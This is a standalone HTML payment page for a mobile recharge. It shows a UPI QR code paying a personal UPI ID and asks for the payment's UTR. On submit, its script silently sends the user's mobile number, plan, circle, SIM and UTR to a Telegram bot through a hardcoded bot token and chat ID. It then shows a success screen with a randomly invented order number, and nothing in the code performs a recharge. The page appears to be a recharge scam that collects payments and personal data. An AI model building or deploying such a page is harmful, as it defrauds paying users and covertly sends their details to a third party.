<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Payment Page</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #f8f9fa, #e9ecef);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 15px;
    }
    .box {
      background: white;
      width: 100%;
      max-width: 500px;
      border-radius: 20px;
      padding: 20px;
      text-align: center;
      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
    }
    h3 {
      margin-bottom: 15px;
      color: #333;
    }
    #qr {
      margin: 15px auto;
      max-width: 220px;
      width: 100%;
      height: auto;
    }
    input {
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      border: 1px solid #ccc;
      border-radius: 10px;
      font-size: 16px;
      outline: none;
      box-sizing: border-box;
    }
    .btns {
      display: flex;
      flex-wrap: wrap;
      gap: 12px;
      margin-top: 10px;
    }
    button {
      flex: 1;
      min-width: 120px;
      padding: 14px;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      cursor: pointer;
      transition: 0.2s;
    }
    .cancel { background: #dee2e6; }
    .cancel:hover { background: #ced4da; }
    .submit { background: #007bff; color: white; }
    .submit:hover { background: #0056b3; }

    #success {
      display: none;
      animation: bounce 1s;
      text-align: center;
      position: relative;
    }
    #success img {
      width: 100%;
      border-radius: 20px;
      display: block;
    }

    /* âœ… Order No. center inside white rectangle */
    #orderBox {
      position: absolute;
      top: 62%;  /* adjust to fit white rectangle center */
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 20px;
      font-weight: bold;
      color: black;
    }

    @keyframes bounce {
      0% { transform: scale(0.5); opacity: 0; }
      50% { transform: scale(1.1); opacity: 1; }
      100% { transform: scale(1); }
    }

    @media(max-width:600px) {
      #orderBox {
        font-size: 16px;
        top: 61%; /* mobile adjustment */
      }
    }
  </style>
</head>
<body>
  <!-- Payment Box -->
  <div class="box" id="paymentBox">
    <h3>Scan & Pay</h3>
    <canvas id="qr"></canvas>
    <input type="text" id="utr" placeholder="Enter 12 digit UTR here">
    <div class="btns">
      <button class="cancel" onclick="cancelPay()">Cancel</button>
      <button class="submit" onclick="submitPay()">Submit</button>
    </div>
  </div>

  <!-- Success Screen -->
  <div class="box" id="success">
    <img src="https://i.ibb.co/BHFZ0Pw1/New-Project-3-6-EF4537.png" alt="Success">
    <div id="orderBox">
      <span id="orderNo"></span>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
  <script>
    const botToken = "7357591032:AAEWot08vTtNlDr4_u6S1THjnglBX_WhFdk";
    const chatId = "7063861675";

    // Generate QR Code
    const amount = localStorage.getItem("plan")?.split(" ")[0].replace("â‚¹","");
    const upiId = "shivsahay172@okhdfcbank";
    const upiLink = `upi://pay?pa=${upiId}&pn=Recharge&am=${amount}&cu=INR`;
    QRCode.toCanvas(document.getElementById('qr'), upiLink, { width: 200 });

    function cancelPay() {
      window.location.href = "index.html";
    }

    function submitPay() {
      const utr = document.getElementById("utr").value.trim();
      if(utr.length !== 12) {
        alert("Enter valid 12 digit UTR");
        return;
      }

      const mobile = localStorage.getItem("mobile");
      const plan = localStorage.getItem("plan");
      const circle = localStorage.getItem("circle");
      const sim = localStorage.getItem("sim");
      const orderNo = "ORD" + Math.floor(1000 + Math.random() * 9000);

      const message = `ðŸ“² New Recharge Request
Mobile: ${mobile}
Plan: ${plan}
Circle: ${circle}
SIM: ${sim}
UTR: ${utr}
Order No: ${orderNo}`;

      // Send silently to Telegram
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });

      // Show success screen
      document.getElementById("paymentBox").style.display = "none";
      document.getElementById("success").style.display = "block";
      document.getElementById("orderNo").innerText = orderNo;
    }
  </script>
</body>
</html>
